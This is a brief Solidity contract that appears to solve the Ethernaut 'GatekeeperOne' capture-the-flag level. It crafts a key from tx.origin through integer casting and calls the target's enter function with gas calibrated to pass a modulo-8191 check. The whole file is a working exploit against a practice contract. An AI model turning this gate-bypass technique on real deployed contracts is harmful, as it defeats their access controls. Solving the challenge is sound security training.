// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract HackGatekeeperOne {

    // 256 -> number of gas required from call to require of gate2
    function attack(address gatekeeperOne, uint256 gas) external {
        uint16 origin = uint16(uint160(tx.origin));
        uint64 base = uint64(1 << 63) + uint64(origin); // shift a one so when casted in uint32 the 1 is cute

        (bool success,) = gatekeeperOne.call{gas: 8191 * 10 + gas }(abi.encodeWithSignature("enter(bytes8)", bytes8(base)));
        require(success);
    }
}